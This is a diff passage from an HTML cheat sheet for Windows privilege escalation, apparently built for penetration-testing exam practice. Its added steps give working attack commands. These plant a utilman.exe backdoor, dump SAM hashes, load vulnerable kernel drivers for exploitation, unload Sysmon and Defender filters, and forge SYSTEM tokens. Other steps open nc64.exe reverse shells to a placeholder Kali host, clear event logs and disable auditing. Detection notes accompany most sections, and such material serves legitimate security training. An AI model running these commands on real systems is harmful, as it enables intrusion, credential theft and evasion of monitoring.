+              <div class="code-block purple">copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe</div>
             </div>
           </div>
           <div class="step">
-            <div class="step-num">4</div>
+            <div class="step-num">5</div>
             <div class="step-content">
-              <div class="step-title">PowerShell version (more reliable)</div>
+              <div class="step-title">Trigger: RDP → lock screen → press Win+U</div>
+              <div class="code-block"># On RDP session: lock screen (Win+L), then click Ease of Access (Win+U)
+# You get a SYSTEM cmd.exe prompt without logging in</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div class="section">
+        <div class="section-header">⚡ Method 2 — PowerShell SetOwner (more reliable for complex ACLs)</div>
+        <div class="section-body">
+          <div class="step">
+            <div class="step-num">1</div>
+            <div class="step-content">
+              <div class="step-title">Take ownership via PowerShell</div>
               <div class="code-block green">$file = "C:\Windows\System32\utilman.exe"
 $acl = Get-Acl $file
-$acl.SetOwner([System.Security.Principal.NTAccount]"$env:USERDOMAIN\$env:USERNAME")
-Set-Acl $file $acl
-$rule = New-Object System.Security.AccessControl.FileSystemAccessRule("$env:USERNAME","FullControl","Allow")
+$owner = [System.Security.Principal.NTAccount]"$env:USERDOMAIN\$env:USERNAME"
+$acl.SetOwner($owner)
+Set-Acl $file $acl</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">2</div>
+            <div class="step-content">
+              <div class="step-title">Then grant FullControl</div>
+              <div class="code-block green">$acl = Get-Acl $file
+$rule = New-Object System.Security.AccessControl.FileSystemAccessRule(
+    "$env:USERNAME","FullControl","Allow")
 $acl.AddAccessRule($rule)
 Set-Acl $file $acl</div>
             </div>
           </div>
         </div>
       </div>
+
+      <div class="section">
+        <div class="section-header">⚡ Method 3 — Take ownership of SAM registry key → dump local hashes</div>
+        <div class="section-body">
+          <div class="step">
+            <div class="step-num">1</div>
+            <div class="step-content">
+              <div class="step-title">Own the SAM hive key via PowerShell</div>
+              <div class="code-block green">$key = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey(
+    "SAM",
+    [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadWriteSubTree,
+    [System.Security.AccessControl.RegistryRights]::TakeOwnership)
+$acl = $key.GetAccessControl()
+$acl.SetOwner([System.Security.Principal.NTAccount]"$env:USERNAME")
+$key.SetAccessControl($acl)</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">2</div>
+            <div class="step-content">
+              <div class="step-title">Now grant read access and dump with reg save</div>
+              <div class="code-block">reg save HKLM\SAM C:\Temp\sam
+reg save HKLM\SYSTEM C:\Temp\system
+# Kali: impacket-secretsdump -sam sam -system system LOCAL</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
       <div class="detection-box">
-        <div class="detection-title">🔍 Detection</div>
-        <div style="font-family:'Share Tech Mono',monospace;font-size:11px;">Event 4670 — permissions on object changed • takeown.exe execution • icacls modifying System32 files • Ownership change on system binaries</div>
+        <div class="detection-title">Detection</div>
+        <div style="font-family:'Share Tech Mono',monospace;font-size:11px;">Event 4670 — permissions on object changed • Event 4663 — write access on system binaries • takeown.exe execution • icacls modifying System32 files • Ownership change on system binaries or registry keys • utilman.exe / sethc.exe hash change</div>
       </div>
     </div>
 
@@ -1237,55 +2036,150 @@ Set-Acl $file $acl</div>
         <div class="page-sub">// LOAD KERNEL DRIVER → EXPLOIT VULN DRIVER → SYSTEM</div>
       </div>
       <div class="info-grid">
-        <div class="info-card"><div class="info-label">Who Has It</div><div class="info-value">Print Operators, some delegated accounts</div></div>
-        <div class="info-card"><div class="info-label">Attack</div><div class="info-value">Load Capcom/szkg64 vuln driver → kernel exploit</div></div>
+        <div class="info-card"><div class="info-label">Who Has It</div><div class="info-value">Print Operators (automatic); some delegated service accounts</div></div>
+        <div class="info-card"><div class="info-label">Attack</div><div class="info-value">Load vulnerable kernel driver via EOPLOADDRIVER → exploit driver → SYSTEM</div></div>
+        <div class="info-card"><div class="info-label">Alt Attack</div><div class="info-value">fltMC unload — remove minifilter AV/EDR drivers without reboot</div></div>
         <div class="info-card"><div class="info-label">Result</div><div class="info-value">NT AUTHORITY\SYSTEM</div></div>
       </div>
 
+      <!-- Attack flow -->
       <div class="section">
-        <div class="section-header">⚡ Attack — Load Vulnerable Driver</div>
+        <div class="section-header">⚡ Attack Flow</div>
+        <div class="section-body">
+          <div class="flow-chain">
+            <div class="flow-node">SeLoadDriver</div><div class="flow-arrow">→</div>
+            <div class="flow-node">EOPLOADDRIVER.exe</div><div class="flow-arrow">→</div>
+            <div class="flow-node">Load vuln .sys</div><div class="flow-arrow">→</div>
+            <div class="flow-node">Exploit driver</div><div class="flow-arrow">→</div>
+            <div class="flow-node">SYSTEM shell</div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Preferred: szkg64 -->
+      <div class="section">
+        <div class="section-header">⚡ Vector 1 — EOPLOADDRIVER + szkg64.sys (PREFERRED on modern Windows)</div>
         <div class="section-body">
           <div class="step">
             <div class="step-num">1</div>
             <div class="step-content">
-              <div class="step-title">Use EOPLOADDRIVER to load the vulnerable driver</div>
-              <div class="code-block">.\EOPLOADDRIVER.exe System\CurrentControlSet\MyService C:\temp\capcom.sys</div>
+              <div class="step-title">Download tools to target</div>
+              <div class="code-block purple">iwr http://{{KALI_IP}}/eoploaddriver_x64.exe -o C:\Temp\eoploaddriver_x64.exe
+iwr http://{{KALI_IP}}/szkg64.sys -o C:\Temp\szkg64.sys</div>
             </div>
           </div>
           <div class="step">
             <div class="step-num">2</div>
             <div class="step-content">
-              <div class="step-title">Run exploit against Capcom driver</div>
-              <div class="code-block purple">.\ExploitCapcom.exe EXPLOITPATH C:\temp\shell.exe
-# ⚠ Capcom.sys is BLOCKED by Windows Driver Blocklist on Win11 22000.194+ and patched Server 2022
-# Use szkg64.sys (Step 3) on modern targets instead</div>
+              <div class="step-title">Load szkg64.sys via eoploaddriver_x64 — creates HKCU registry key and calls NtLoadDriver</div>
+              <div class="code-block">C:\Temp\eoploaddriver_x64.exe System\CurrentControlSet\MyService C:\Temp\szkg64.sys</div>
             </div>
           </div>
           <div class="step">
             <div class="step-num">3</div>
             <div class="step-content">
-              <div class="step-title">Preferred on modern targets: szkg64.sys (CVE-2018-15732)</div>
-              <div class="code-block">.\EOPLOADDRIVER.exe System\CurrentControlSet\MyService C:\temp\szkg64.sys
-# Then exploit via kernel vuln</div>
+              <div class="step-title">Exploit the loaded driver (CVE-2018-15732) — arbitrary write → SYSTEM token</div>
+              <div class="code-block green"># Run the szkg64 exploit binary against the loaded driver
+# Exploit overwrites _SEP_TOKEN_PRIVILEGES to elevate current token
+.\szkg64exploit.exe</div>
             </div>
           </div>
           <div class="step">
             <div class="step-num">4</div>
             <div class="step-content">
-              <div class="step-title">Unload security drivers (bypass AV/EDR)</div>
-              <div class="code-block orange">fltMC unload sysmondrv
-fltMC unload WdFilter</div>
+              <div class="step-title">Cleanup registry key after exploitation</div>
+              <div class="code-block">reg delete HKCU\System\CurrentControlSet\MyService /f</div>
             </div>
+          </div>
+          <div class="alert alert-gold">
+            <span class="alert-icon">💡</span>
+            <span>szkg64.sys (CVE-2018-15732) is preferred on Win10/11 22H2+ because Capcom.sys is on the Microsoft Vulnerable Driver Blocklist and will fail to load. EOPLOADDRIVER creates the registry key under HKCU (no admin registry write needed) and calls NtLoadDriver. Registry key path format: <code>System\CurrentControlSet\&lt;ServiceName&gt;</code></span>
           </div>
           <div class="alert alert-teal">
             <span class="alert-icon">🔗</span>
-            <span>Tools: <a href="https://github.com/k4sth4/SeLoadDriverPrivilege" target="_blank">github.com/k4sth4/SeLoadDriverPrivilege</a> | <a href="https://www.tarlogic.com/blog/seloaddriverprivilege-privilege-escalation/" target="_blank">Tarlogic writeup</a></span>
+            <span>Tool: <a href="https://github.com/TarlogicSecurity/EoPLoadDriver" target="_blank">github.com/TarlogicSecurity/EoPLoadDriver</a> | Blog: <a href="https://www.tarlogic.com/blog/seloaddriverprivilege-privilege-escalation/" target="_blank">tarlogic.com/blog/seloaddriverprivilege-privilege-escalation</a></span>
           </div>
         </div>
       </div>
+
+      <!-- Legacy: Capcom -->
+      <div class="section">
+        <div class="section-header">⚡ Vector 2 — EOPLOADDRIVER + Capcom.sys + ExploitCapcom (LEGACY — blocked on modern Windows)</div>
+        <div class="section-body">
+          <div class="step">
+            <div class="step-num">1</div>
+            <div class="step-content">
+              <div class="step-title">Load Capcom.sys vulnerable driver</div>
+              <div class="code-block">C:\Temp\eoploaddriver_x64.exe System\CurrentControlSet\CapService C:\Temp\Capcom.sys</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">2</div>
+            <div class="step-content">
+              <div class="step-title">Run ExploitCapcom against the loaded driver to execute arbitrary command as SYSTEM</div>
+              <div class="code-block green">C:\Temp\ExploitCapcom.exe EXPLOIT "C:\Temp\nc64.exe {{KALI_IP}} {{PORT}} -e cmd"</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">3</div>
+            <div class="step-content">
+              <div class="step-title">Kali: catch SYSTEM shell</div>
+              <div class="code-block green">nc -lvnp {{PORT}}</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">4</div>
+            <div class="step-content">
+              <div class="step-title">Cleanup registry key</div>
+              <div class="code-block">reg delete HKCU\System\CurrentControlSet\CapService /f</div>
+            </div>
+          </div>
+          <div class="alert alert-red">
+            <span class="alert-icon">⚠</span>
+            <span>CAPCOM.SYS IS BLOCKED — Microsoft added Capcom.sys to the Vulnerable Driver Blocklist enabled by default on Windows 11 22H2+ and patched Server 2022. NtLoadDriver will fail with STATUS_INVALID_IMAGE_HASH. Use szkg64.sys (Vector 1) on modern targets. Capcom still works on unpatched Win10 and older Server 2019.</span>
+          </div>
+          <div class="alert alert-teal">
+            <span class="alert-icon">🔗</span>
+            <span>Tool: <a href="https://github.com/tandasat/ExploitCapcom" target="_blank">github.com/tandasat/ExploitCapcom</a> (original — command hardcoded in source, rebuild required) | Pre-compiled forks with CLI args available on GitHub.</span>
+          </div>
+        </div>
+      </div>
+
+      <!-- AV/EDR bypass: fltMC unload -->
+      <div class="section">
+        <div class="section-header">⚡ Vector 3 — fltMC unload: Remove AV/EDR minifilter drivers (requires SeLoadDriver)</div>
+        <div class="section-body">
+          <div class="step">
+            <div class="step-num">1</div>
+            <div class="step-content">
+              <div class="step-title">List loaded minifilter drivers to identify target</div>
+              <div class="code-block">fltMC filters</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">2</div>
+            <div class="step-content">
+              <div class="step-title">Unload Sysmon monitoring driver (removes process/network event logging)</div>
+              <div class="code-block orange">fltMC unload SysmonDrv</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">3</div>
+            <div class="step-content">
+              <div class="step-title">Unload Windows Defender minifilter (note: WdFilter protected by Tamper Protection on patched Win11)</div>
+              <div class="code-block orange">fltMC unload WdFilter</div>
+            </div>
+          </div>
+          <div class="alert alert-gold">
+            <span class="alert-icon">💡</span>
+            <span>SeLoadDriverPrivilege is required to call FilterUnload (fltMC). Unloading SysmonDrv is reliably effective on unprotected machines. WdFilter will return error 0x801f0010 if Windows Defender Tamper Protection is enabled on Win11 22H2+. Use as a pre-step before executing further payloads.</span>
+          </div>
+        </div>
+      </div>
+
       <div class="detection-box">
         <div class="detection-title">🔍 Detection</div>
-        <div style="font-family:'Share Tech Mono',monospace;font-size:11px;">Event 7045 — new service/driver installed • Unsigned driver load • fltMC unloading security drivers • New registry key under CurrentControlSet\Services</div>
+        <div style="font-family:'Share Tech Mono',monospace;font-size:11px;">Event 7045 — new service/driver installed • Event 4657 — registry key creation under HKCU\System\CurrentControlSet\&lt;ServiceName&gt; • Unsigned or blocklisted driver load attempt • fltMC.exe unloading security minifilter drivers • EOPLOADDRIVER.exe or ExploitCapcom.exe execution</div>
       </div>
     </div>
 
@@ -1293,42 +2187,65 @@ fltMC unload WdFilter</div>
     <div id="page-setcb" class="page">
       <div class="page-header">
         <div class="page-title">🏛️ SeTcbPrivilege <span class="severity-badge sev-rare">RARE / EXTREME</span></div>
-        <div class="page-sub">// ACT AS PART OF OS → CREATE SYSTEM TOKENS → INSTANT SYSTEM</div>
+        <div class="page-sub">// ACT AS PART OF OS → LsaLogonUser S4U → FORGE SYSTEM TOKEN → INSTANT SYSTEM</div>
       </div>
       <div class="info-grid">
-        <div class="info-card"><div class="info-label">Who Has It</div><div class="info-value">Rarely delegated — very powerful</div></div>
-        <div class="info-card"><div class="info-label">Attack</div><div class="info-value">TcbElevation.exe → spawn SYSTEM process</div></div>
+        <div class="info-card"><div class="info-label">Who Has It</div><div class="info-value">Almost never delegated — extremely rare in the wild</div></div>
+        <div class="info-card"><div class="info-label">Mechanism</div><div class="info-value">SeTcb allows LsaLogonUser S4U logon → forge token with SYSTEM SID S-1-5-18</div></div>
+        <div class="info-card"><div class="info-label">Attack</div><div class="info-value">TcbElevation.exe [ServiceName] [CmdLine] → SYSTEM process</div></div>
         <div class="info-card"><div class="info-label">Result</div><div class="info-value">NT AUTHORITY\SYSTEM</div></div>
       </div>
 
       <div class="section">
-        <div class="section-header">⚡ Attack</div>
+        <div class="section-header">⚡ Attack — TcbElevation.exe (antonioCoco / splinter_code / decoder_it)</div>
         <div class="section-body">
           <div class="step">
             <div class="step-num">1</div>
             <div class="step-content">
-              <div class="step-title">Use TcbElevation.exe (antonioCoco)</div>
-              <div class="code-block purple">iwr http://192.168.45.250/TcbElevation.exe -o TcbElevation.exe
-.\TcbElevation.exe pwn "C:\Windows\system32\cmd.exe /c nc64.exe 192.168.45.250 4444 -e cmd"</div>
+              <div class="step-title">Download TcbElevation.exe (pre-compiled binary available at b4lisong repo)</div>
+              <div class="code-block purple">iwr http://{{KALI_IP}}/TcbElevation.exe -o C:\Temp\TcbElevation.exe</div>
             </div>
           </div>
           <div class="step">
             <div class="step-num">2</div>
             <div class="step-content">
-              <div class="step-title">Alternative: LsaLogonUser abuse (create token with SeTcb)</div>
-              <div class="code-block"># SeTcbPrivilege allows calling LsaLogonUser without credentials
-# → create a SYSTEM-level token → spawn process</div>
+              <div class="step-title">Spawn SYSTEM reverse shell — CLI syntax: TcbElevation.exe [ServiceName] [CmdLine]</div>
+              <div class="code-block green">C:\Temp\TcbElevation.exe syscvs "C:\Windows\System32\cmd.exe /c C:\Temp\nc64.exe {{KALI_IP}} {{PORT}} -e cmd"</div>
             </div>
+          </div>
+          <div class="step">
+            <div class="step-num">3</div>
+            <div class="step-content">
+              <div class="step-title">Kali: catch SYSTEM shell</div>
+              <div class="code-block green">nc -lvnp {{PORT}}</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">4</div>
+            <div class="step-content">
+              <div class="step-title">Alternative: spawn SYSTEM cmd.exe interactively (RDP / local access)</div>
+              <div class="code-block">C:\Temp\TcbElevation.exe syscvs "C:\Windows\System32\cmd.exe"</div>
+            </div>
+          </div>
+          <div class="alert alert-gold">
+            <span class="alert-icon">💡</span>
+            <span><strong>How it works:</strong> SeTcbPrivilege permits calling <code>LsaLogonUser</code> with an S4U (Service-For-User) logon type — no credentials required. This creates a SYSTEM-context logon session bearing SID S-1-5-18. TcbElevation uses SSPI hooks + <code>LsaLogonUser</code> to produce the token, then <code>CreateProcessWithLogonW</code> to run the target command as SYSTEM. The [ServiceName] argument is an arbitrary internal label — any string works. Confirmed working on PG Practice Symbolic machine.</span>
           </div>
           <div class="alert alert-teal">
             <span class="alert-icon">🔗</span>
-            <span>Gist: <a href="https://gist.github.com/antonioCoco/19563adef860614b56d010d92e67d178" target="_blank">gist.github.com/antonioCoco/TcbElevation</a></span>
+            <span>Source: <a href="https://gist.github.com/antonioCoco/19563adef860614b56d010d92e67d178" target="_blank">gist.github.com/antonioCoco/19563adef860614b56d010d92e67d178</a> (TcbElevation.cpp) | Pre-compiled: <a href="https://github.com/b4lisong/SeTcbPrivilege-Abuse" target="_blank">github.com/b4lisong/SeTcbPrivilege-Abuse</a></span>
           </div>
         </div>
       </div>
+
+      <div class="alert alert-gold">
+        <span class="alert-icon">💡</span>
+        <span><strong>Rarity note:</strong> SeTcbPrivilege is almost never granted to regular accounts. Expect it on specialized service accounts, misconfigured Windows services, or CTF/exam environments. If you see it in <code>whoami /priv</code> — it is an instant SYSTEM escalation.</span>
+      </div>
+
       <div class="detection-box">
         <div class="detection-title">🔍 Detection</div>
-        <div style="font-family:'Share Tech Mono',monospace;font-size:11px;">LsaLogonUser call from non-system process • Event 4672 SeTcbPrivilege assigned • Unusual service installation spawning SYSTEM child process</div>
+        <div style="font-family:'Share Tech Mono',monospace;font-size:11px;">LsaLogonUser S4U call from non-SYSTEM process • Event 4624 logon type 5 (Service) for SYSTEM account created by unusual parent • Event 4672 SeTcbPrivilege assigned to new token • SYSTEM-integrity child process spawned by unusual parent • TcbElevation.exe execution</div>
       </div>
     </div>
 
@@ -1336,40 +2253,104 @@ fltMC unload WdFilter</div>
     <div id="page-secreatetoken" class="page">
       <div class="page-header">
         <div class="page-title">🪙 SeCreateTokenPrivilege <span class="severity-badge sev-rare">VERY RARE</span></div>
-        <div class="page-sub">// FORGE ARBITRARY ACCESS TOKEN WITH ANY PRIVILEGES → SYSTEM</div>
+        <div class="page-sub">// FORGE ARBITRARY ACCESS TOKEN WITH ANY SID → NEEDS SeImpersonate OR SeAssignPrimary TO USE IT</div>
       </div>
       <div class="info-grid">
-        <div class="info-card"><div class="info-label">Who Has It</div><div class="info-value">Almost never delegated — extremely rare</div></div>
-        <div class="info-card"><div class="info-label">Attack</div><div class="info-value">NtCreateToken with admin groups</div></div>
-        <div class="info-card"><div class="info-label">Result</div><div class="info-value">Local Administrator / SYSTEM</div></div>
+        <div class="info-card"><div class="info-label">Who Has It</div><div class="info-value">Almost never delegated — extremely rare even in CTF/exam environments</div></div>
+        <div class="info-card"><div class="info-label">Mechanism</div><div class="info-value">NtCreateToken syscall — forge a token with any SID (e.g. Administrators S-1-5-32-544)</div></div>
+        <div class="info-card"><div class="info-label">CRITICAL Requirement</div><div class="info-value">Also need SeImpersonate OR SeAssignPrimaryToken to APPLY the forged token</div></div>
+        <div class="info-card"><div class="info-label">Result</div><div class="info-value">Local Administrator / SYSTEM (if companion privilege present)</div></div>
+      </div>
+
+      <div class="alert alert-red">
+        <span class="alert-icon">⚠</span>
+        <span><strong>CRITICAL — SeCreateTokenPrivilege alone cannot escalate privileges.</strong> NtCreateToken forges a token, but to use it you MUST ALSO have:<br>
+        • <strong>SeImpersonatePrivilege</strong> → use <code>ImpersonateLoggedOnUser</code> to impersonate the forged token in the current thread, OR<br>
+        • <strong>SeAssignPrimaryTokenPrivilege</strong> → use <code>CreateProcessAsUser</code> / <code>AssignPrimaryToken</code> to assign the token to a new process.<br>
+        Without one of these companion privileges, the forged token exists but cannot be applied to any thread or process.</span>
       </div>
 
       <div class="section">
-        <div class="section-header">⚡ Attack</div>
+        <div class="section-header">⚡ Step 0 — Verify you have the required companion privilege</div>
+        <div class="section-body">
+          <div class="step">
+            <div class="step-num">0</div>
+            <div class="step-content">
+              <div class="step-title">Check for companion privilege — you need at least one</div>
+              <div class="code-block orange">whoami /priv | findstr /i "SeImpersonate SeAssignPrimary SeCreateToken"
+# If ONLY SeCreateTokenPrivilege is enabled — you cannot complete the escalation without another bug
+# If SeImpersonatePrivilege is also present — proceed with workflow below</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div class="section">
+        <div class="section-header">⚡ Attack — PrivFu SeCreateTokenPrivilegePoC (daem0nc0re)</div>
         <div class="section-body">
           <div class="step">
             <div class="step-num">1</div>
             <div class="step-content">
-              <div class="step-title">Compile + run PrivFu CreateTokenVariant (daem0nc0re)</div>
-              <div class="code-block purple"># Build from source: github.com/daem0nc0re/PrivFu → CreateTokenVariant
-.\CreateTokenVariant.exe
-# Calls NtCreateToken to forge a token with Administrators SID (S-1-5-32-544)</div>
+              <div class="step-title">Download / compile SeCreateTokenPrivilegePoC from PrivFu</div>
+              <div class="code-block purple">iwr http://{{KALI_IP}}/SeCreateTokenPrivilegePoC.exe -o C:\Temp\SeCreateTokenPrivilegePoC.exe
+# Source: github.com/daem0nc0re/PrivFu → PrivilegedOperations/SeCreateTokenPrivilegePoC/</div>
             </div>
           </div>
           <div class="step">
             <div class="step-num">2</div>
             <div class="step-content">
-              <div class="step-title">⚠ CRITICAL: SeCreateTokenPrivilege alone is not enough</div>
-              <div class="code-block orange"># You MUST also have SeImpersonatePrivilege OR SeAssignPrimaryTokenPrivilege
-# to actually USE the forged token. Without one of these, the token cannot be applied.
-whoami /priv | findstr "SeImpersonate\|SeAssignPrimary"</div>
+              <div class="step-title">Run the PoC — calls NtCreateToken to forge a token with Administrators SID (S-1-5-32-544)</div>
+              <div class="code-block green">C:\Temp\SeCreateTokenPrivilegePoC.exe</div>
             </div>
+          </div>
+          <div class="step">
+            <div class="step-num">3</div>
+            <div class="step-content">
+              <div class="step-title">The PoC spawns a SYSTEM/Administrator shell using ImpersonateLoggedOnUser (requires SeImpersonate)</div>
+              <div class="code-block"># If SeImpersonatePrivilege is present — the forged admin token is applied via ImpersonateLoggedOnUser
+# If SeAssignPrimaryTokenPrivilege is present — a new process is spawned via CreateProcessAsUser with the token</div>
+            </div>
+          </div>
+          <div class="alert alert-gold">
+            <span class="alert-icon">💡</span>
+            <span>Workflow: NtCreateToken → token with Administrators SID S-1-5-32-544 → ImpersonateLoggedOnUser (SeImpersonate) or AssignPrimaryToken (SeAssignPrimary) → elevated thread/process. PrivFu PoC binary name follows folder convention: <code>SeCreateTokenPrivilegePoC.exe</code></span>
+          </div>
+        </div>
+      </div>
+
+      <div class="section">
+        <div class="section-header">⚡ Attack — poptoke (hatRiot/token-priv research suite)</div>
+        <div class="section-body">
+          <div class="step">
+            <div class="step-num">1</div>
+            <div class="step-content">
+              <div class="step-title">Build poptoke from token-priv repo (research/reference code — not a turn-key binary)</div>
+              <div class="code-block purple"># Clone: github.com/hatRiot/token-priv
+# Open poptoke/poptoke.sln in Visual Studio → Build → poptoke.exe
+# The SeCreateTokenPrivilege.cpp file contains the NtCreateToken PoC implementation</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">2</div>
+            <div class="step-content">
+              <div class="step-title">Run poptoke.exe — invokes SeCreateToken logic from SeCreateTokenPrivilege.cpp</div>
+              <div class="code-block green">C:\Temp\poptoke.exe</div>
+            </div>
+          </div>
+          <div class="alert alert-gold">
+            <span class="alert-icon">💡</span>
+            <span>poptoke is a research suite, not a polished tool. It ships as C++ source only — you must compile it. The repo is primarily a reference for understanding how each privilege can be abused, not a ready-to-run exploit. Use PrivFu's SeCreateTokenPrivilegePoC for faster deployment.</span>
           </div>
           <div class="alert alert-teal">
             <span class="alert-icon">🔗</span>
-            <span>Tools: <a href="https://github.com/hatRiot/token-priv" target="_blank">github.com/hatRiot/token-priv</a> | <a href="https://github.com/daem0nc0re/PrivFu" target="_blank">github.com/daem0nc0re/PrivFu</a></span>
+            <span>Tools: <a href="https://github.com/daem0nc0re/PrivFu" target="_blank">github.com/daem0nc0re/PrivFu</a> (SeCreateTokenPrivilegePoC — main tool) | <a href="https://github.com/hatRiot/token-priv" target="_blank">github.com/hatRiot/token-priv</a> (poptoke — research reference)</span>
           </div>
         </div>
+      </div>
+
+      <div class="detection-box">
+        <div class="detection-title">🔍 Detection</div>
+        <div style="font-family:'Share Tech Mono',monospace;font-size:11px;">NtCreateToken syscall from non-SYSTEM process • Event 4672 SeCreateTokenPrivilege + SeImpersonatePrivilege assigned to same logon • ImpersonateLoggedOnUser followed by privileged operation • New process spawned with Admin token from unexpected parent • SeCreateTokenPrivilegePoC.exe or poptoke.exe execution</div>
       </div>
     </div>
 
@@ -1379,37 +2360,63 @@ whoami /priv | findstr "SeImpersonate\|SeAssignPrimary"</div>
         <div class="page-title">🔐 SeSecurityPrivilege <span class="severity-badge sev-gold">UNCOMMON</span></div>
         <div class="page-sub">// MANAGE AUDIT LOG → READ SECURITY LOG → CLEAR EVENTS → OPSEC</div>
       </div>
+      <div class="info-grid">
+        <div class="info-card"><div class="info-label">Who Has It</div><div class="info-value">Security auditors, some svc accounts, Administrators</div></div>
+        <div class="info-card"><div class="info-label">Primary Use</div><div class="info-value">Log clearing (cover tracks), read SACL, audit policy reads</div></div>
+        <div class="info-card"><div class="info-label">Result</div><div class="info-value">Opsec improvement — not a direct privesc on its own</div></div>
+        <div class="info-card"><div class="info-label">Chained With</div><div class="info-value">Any privesc — clear logs after exploitation</div></div>
+      </div>
       <div class="section">
         <div class="section-header">⚡ Attacks</div>
         <div class="section-body">
           <div class="step">
             <div class="step-num">1</div>
             <div class="step-content">
-              <div class="step-title">Clear Security event log (cover tracks)</div>
+              <div class="step-title">Clear Security, System, and Application event logs (cover tracks)</div>
               <div class="code-block orange">wevtutil cl Security
 wevtutil cl System
-wevtutil cl Application</div>
+wevtutil cl Application
+# Verify cleared:
+wevtutil gli Security</div>
             </div>
           </div>
           <div class="step">
             <div class="step-num">2</div>
             <div class="step-content">
-              <div class="step-title">Read Security log (intel gathering)</div>
-              <div class="code-block">wevtutil qe Security /c:50 /rd:true /f:text</div>
+              <div class="step-title">Read Security log — intel on what is being monitored</div>
+              <div class="code-block">wevtutil qe Security /c:50 /rd:true /f:text
+# Look for: 4624 logons, 4720 account created, 4672 special logon
+wevtutil qe Security /c:20 /rd:true /f:text /q:"*[System[EventID=4625]]"</div>
             </div>
           </div>
           <div class="step">
             <div class="step-num">3</div>
             <div class="step-content">
-              <div class="step-title">Read SACL on objects (audit settings)</div>
-              <div class="code-block">Get-Acl C:\Windows\System32\lsass.exe | Select-Object Audit</div>
+              <div class="step-title">Read SACL (audit settings) on high-value objects</div>
+              <div class="code-block">Get-Acl C:\Windows\System32\lsass.exe | Select-Object -ExpandProperty Audit
+# Also works on registry keys:
+(Get-Acl "HKLM:\SAM").Audit</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">4</div>
+            <div class="step-content">
+              <div class="step-title">Modify audit policy to stop generating logs for your actions</div>
+              <div class="code-block orange">auditpol /set /subcategory:"Logon" /success:disable /failure:disable
+auditpol /set /subcategory:"Process Creation" /success:disable
+# Restore after:
+auditpol /set /subcategory:"Logon" /success:enable /failure:enable</div>
             </div>
           </div>
           <div class="alert alert-gold">
             <span class="alert-icon">💡</span>
-            <span>Primary value: log clearing for opsec, and reading security events to understand what's being monitored.</span>
+            <span><strong>Opsec play:</strong> Before exploitation on a real engagement, use SeSecurityPrivilege to read what audit policies are active, then temporarily disable logging for your specific actions. Re-enable before leaving.</span>
           </div>
         </div>
+      </div>
+      <div class="detection-box">
+        <div class="detection-title">Detection</div>
+        <div style="font-family:'Share Tech Mono',monospace;font-size:11px;">Event 1102 — Security audit log cleared • Event 4719 — audit policy changed • Event 4907 — auditing settings changed on object • wevtutil.exe with "cl" argument</div>
       </div>
     </div>
 
@@ -1417,35 +2424,78 @@ wevtutil cl Application</div>
     <div id="page-sesymlink" class="page">
       <div class="page-header">
         <div class="page-title">🔗 SeCreateSymbolicLinkPrivilege <span class="severity-badge sev-gold">UNCOMMON</span></div>
-        <div class="page-sub">// SYMLINK ATTACKS → REDIRECT FILE OPS TO PRIVILEGED LOCATIONS</div>
+        <div class="page-sub">// SYMLINK ATTACKS → REDIRECT PRIVILEGED FILE OPS → WRITE TO SYSTEM LOCATIONS</div>
+      </div>
+      <div class="info-grid">
+        <div class="info-card"><div class="info-label">Who Has It</div><div class="info-value">Developers (WSL), some service accounts, Administrators</div></div>
+        <div class="info-card"><div class="info-label">Attack</div><div class="info-value">Symlink user-writable path → system path, trick privileged service</div></div>
+        <div class="info-card"><div class="info-label">Result</div><div class="info-value">Write to arbitrary privileged location via SYSTEM service</div></div>
+        <div class="info-card"><div class="info-label">Required Chain</div><div class="info-value">SYSTEM service that writes predictably to a user-controlled path</div></div>
       </div>
       <div class="section">
-        <div class="section-header">⚡ Symlink Attack</div>
+        <div class="section-header">⚡ Core Technique — Redirect SYSTEM Service Write</div>
         <div class="section-body">
+          <div class="flow-chain">
+            <div class="flow-node">Find SYSTEM svc writing to writable path</div><div class="flow-arrow">→</div>
+            <div class="flow-node">Create symlink at that path</div><div class="flow-arrow">→</div>
+            <div class="flow-node">Point symlink at System32 target</div><div class="flow-arrow">→</div>
+            <div class="flow-node">Service writes to System32</div><div class="flow-arrow">→</div>
+            <div class="flow-node">SYSTEM</div>
+          </div>
           <div class="step">
             <div class="step-num">1</div>
             <div class="step-content">
-              <div class="step-title">Create symlink from writable location → privileged file</div>
-              <div class="code-block purple">cmd /c mklink C:\Temp\target.dll C:\Windows\System32\target.dll
-# Or PS:
-New-Item -ItemType SymbolicLink -Path C:\Temp\link -Target C:\Windows\System32\vuln.dll</div>
+              <div class="step-title">Find services writing predictable files to user-writable paths</div>
+              <div class="code-block">procmon.exe  # Filter: Path contains C:\Temp OR C:\ProgramData, Operation=WriteFile, User=SYSTEM
+# Look for log files, temp files, cache files written by SYSTEM services</div>
             </div>
           </div>
           <div class="step">
             <div class="step-num">2</div>
             <div class="step-content">
-              <div class="step-title">Combine with a service that writes to a writable path</div>
-              <div class="code-block">
-# If a SYSTEM service writes to C:\Temp\log.txt:
-# Create symlink: C:\Temp\log.txt → C:\Windows\System32\target_dll
-# Service write goes to System32 instead</div>
+              <div class="step-title">Create a symlink at the service's write destination</div>
+              <div class="code-block purple"># Built-in (requires SeCreateSymbolicLink or admin):
+cmd /c mklink C:\Temp\service_log.tmp C:\Windows\System32\target.dll
+
+# PowerShell equivalent:
+New-Item -ItemType SymbolicLink -Path "C:\Temp\service_log.tmp" -Target "C:\Windows\System32\target.dll"
+
+# Directory symlink (if service writes to a folder):
+cmd /c mklink /D C:\Temp\WritableDir C:\Windows\System32\</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">3</div>
